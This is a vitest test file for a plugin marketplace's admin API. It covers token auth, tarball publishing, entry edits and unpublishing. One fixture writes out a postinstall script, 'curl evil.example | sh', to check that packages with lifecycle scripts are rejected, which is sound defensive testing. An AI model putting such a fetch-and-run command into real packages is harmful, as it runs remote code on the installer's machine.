import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { parseCatalogProviderPage } from 'dsh-community-market/contracts'
import { adminHeaders, bootTestMarket, publishTgz, type TestMarket } from './helpers/server.ts'
import { cleanPackageManifest } from './helpers/tar.ts'

describe('admin bearer-token auth (D5, fail-closed)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  async function postPrepare(baseUrl: string, headers: Record<string, string>): Promise<number> {
    const response = await fetch(`${baseUrl}/v1/admin/manifest/prepare`, { method: 'POST', headers })
    return response.status
  }

  it('answers 401 admin-disabled on every admin endpoint when no token is configured', async () => {
    const disabled = await bootTestMarket({ adminToken: null })
    try {
      for (const [method, path] of [
        ['POST', '/v1/admin/manifest/prepare'],
        ['GET', '/v1/admin/state'],
        ['GET', '/v1/admin/manifest/pending'],
      ] as const) {
        const response = await fetch(`${disabled.baseUrl}${path}`, {
          method,
          headers: { authorization: 'Bearer whatever' },
        })
        expect(response.status, path).toBe(401)
        const parsed = await response.json() as { error: { code: string; message: string } }
        expect(parsed.error.code).toBe('admin-disabled')
        expect(parsed.error.message).toContain('MARKET_SERVER_ADMIN_TOKEN')
      }
      // Even artifact upload is disabled.
      const upload = await publishTgz(disabled.baseUrl, 'whatever')
      expect(upload.status).toBe(401)
    } finally {
      await disabled.close()
    }
  })

  it('answers 401 unauthorized for a missing or wrong token; accepts the correct one', async () => {
    expect(await postPrepare(market.baseUrl, {})).toBe(401)
    expect(await postPrepare(market.baseUrl, adminHeaders('wrong-token'))).toBe(401)
    const bad = await fetch(`${market.baseUrl}/v1/admin/manifest/prepare`, {
      method: 'POST',
      headers: adminHeaders('wrong-token'),
    })
    expect(((await bad.json()) as { error: { code: string } }).error.code).toBe('unauthorized')

    expect(await postPrepare(market.baseUrl, adminHeaders('test-admin-token'))).toBe(200)
  })

  it('rejects malformed authorization schemes', async () => {
    const basic = await fetch(`${market.baseUrl}/v1/admin/state`, {
      headers: { authorization: 'Basic dXNlcjpwYXNz' },
    })
    expect(basic.status).toBe(401)
  })
})

describe('admin entry management (publish / edit / unpublish)', () => {
  let market: TestMarket

  beforeEach(async () => {
    market = await bootTestMarket()
  })

  afterEach(async () => {
    await market.close()
  })

  it('publishes an artifact and lists it in the self-validated provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(published.status).toBe(201)
    const { entry, sha256 } = published.body as { entry: { id: string; packageName: string; version: string; tarball: string }; sha256: string }
    expect(entry.id).toBe('huaanwork/sample-plugin@1.2.3')
    expect(entry.packageName).toBe('@huaanwork/sample-plugin')
    expect(sha256).toMatch(/^[0-9a-f]{64}$/u)

    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const items = (page as { items: Array<{ id: string; name: string; latestVersion: string }> }).items
    expect(items).toHaveLength(1)
    expect(items[0]).toMatchObject({
      id: 'huaanwork/sample-plugin@1.2.3',
      name: '@huaanwork/sample-plugin',
      latestVersion: '1.2.3',
    })
  })

  it('rejects publishing a non-zero-dependency tarball at publish time (honest error)', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ dependencies: { lodash: '^4.0.0' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('nonzero-dependencies')
    expect(error.message).toContain('lodash')
  })

  it('rejects publishing a tarball with lifecycle scripts at publish time', async () => {
    const result = await publishTgz(
      market.baseUrl,
      'test-admin-token',
      cleanPackageManifest({ scripts: { postinstall: 'curl evil.example | sh' } }),
    )
    expect(result.status).toBe(422)
    const { error } = result.body as { error: { code: string; message: string } }
    expect(error.code).toBe('lifecycle-scripts')
    expect(error.message).toContain('postinstall')
  })

  it('rejects publishing bytes that are not a tarball', async () => {
    const params = new URLSearchParams({ displayName: 'X', summary: 'Y' })
    const response = await fetch(`${market.baseUrl}/v1/admin/artifacts?${params.toString()}`, {
      method: 'POST',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/gzip' },
      body: Buffer.from('not a tarball at all'),
    })
    expect(response.status).toBe(400)
    expect(((await response.json()) as { error: { code: string } }).error.code).toBe('invalid-tarball')
  })

  it('rejects re-publishing the same name@version with a 409', async () => {
    expect((await publishTgz(market.baseUrl, 'test-admin-token')).status).toBe(201)
    const again = await publishTgz(market.baseUrl, 'test-admin-token')
    expect(again.status).toBe(409)
    expect(((again.body as { error: { code: string } }).error.code)).toBe('already-published')
  })

  it('edits display fields and surfaces them in the provider page', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(`${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'Renamed Plugin', summary: 'New summary', categories: ['utility', 'productivity'] }),
    })
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as {
      items: Array<{ displayName: string; summary: string; categories: string[] }>
    }
    expect(page.items[0]?.displayName).toBe('Renamed Plugin')
    expect(page.items[0]?.summary).toBe('New summary')
    expect(page.items[0]?.categories).toEqual(['utility', 'productivity'])
  })

  it('preflights URL-typed display fields: empty is OK, non-https is rejected (R15)', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)

    // empty homepage: fine (unset)
    const empty = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ homepage: '' }),
    })
    expect(empty.status).toBe(200)

    // https values: accepted, and they land in the provider page (which stays contract-valid)
    const https = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({
        homepage: 'https://example.internal/docs',
        publisherName: 'HuaAn',
        publisherUrl: 'https://example.internal',
        repositoryUrl: 'https://example.internal/repo.git',
      }),
    })
    expect(https.status).toBe(200)
    const page = await (await fetch(`${market.baseUrl}/v1/plugins`)).json()
    expect(() => parseCatalogProviderPage(page)).not.toThrow()
    const item = (page as { items: Array<{ homepage: string; publisher: { name: string; url: string }; repository: { url: string } }> }).items[0]!
    expect(item.homepage).toBe('https://example.internal/docs')
    expect(item.publisher).toEqual({ name: 'HuaAn', url: 'https://example.internal' })
    expect(item.repository).toEqual({ url: 'https://example.internal/repo.git' })

    // plain http / ftp values: rejected with a pointer at the field
    for (const [field, value] of [['homepage', 'http://intranet/plain'], ['publisherUrl', 'ftp://example'], ['repositoryUrl', 'http://git.internal/x']] as const) {
      const rejected = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify({ [field]: value }),
      })
      expect(rejected.status, `${field}=${value}`).toBe(400)
      const parsed = await rejected.json() as { error: { code: string; message: string } }
      expect(parsed.error.code).toBe('invalid-entry-patch')
      expect(parsed.error.message).toContain(field)
      expect(parsed.error.message).toContain('https')
    }
  })

  it('unpublishes an entry: gone from the page, state reports it', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const response = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(response.status).toBe(200)

    const page = (await (await fetch(`${market.baseUrl}/v1/plugins`)).json()) as { page: { total: number } }
    expect(page.page.total).toBe(0)

    const state = (await (await fetch(`${market.baseUrl}/v1/admin/state`, { headers: adminHeaders('test-admin-token') })).json()) as {
      entries: unknown[]
      entryCount: number
    }
    expect(state.entryCount).toBe(0)
    expect(state.entries).toEqual([])

    // unpublishing again: 404
    const again = await fetch(
      `${market.baseUrl}/v1/admin/entries/${encodeURIComponent(entry.id)}/unpublish`,
      { method: 'POST', headers: adminHeaders('test-admin-token') },
    )
    expect(again.status).toBe(404)
  })

  it('rejects patches with unknown or wrongly-typed fields', async () => {
    const published = await publishTgz(market.baseUrl, 'test-admin-token')
    const { entry } = published.body as { entry: { id: string } }
    const id = encodeURIComponent(entry.id)
    const patch = async (body: unknown): Promise<number> => {
      const response = await fetch(`${market.baseUrl}/v1/admin/entries/${id}`, {
        method: 'PATCH',
        headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
        body: JSON.stringify(body),
      })
      return response.status
    }
    expect(await patch({ noSuchField: 'x' })).toBe(400)
    expect(await patch({ displayName: '' })).toBe(400)
    expect(await patch({ categories: 'not-an-array' })).toBe(400)
    expect(await patch('not-an-object')).toBe(400)
    // unknown id
    const missing = await fetch(`${market.baseUrl}/v1/admin/entries/nope%40missing`, {
      method: 'PATCH',
      headers: { ...adminHeaders('test-admin-token'), 'content-type': 'application/json' },
      body: JSON.stringify({ displayName: 'X' }),
    })
    expect(missing.status).toBe(404)
  })
})
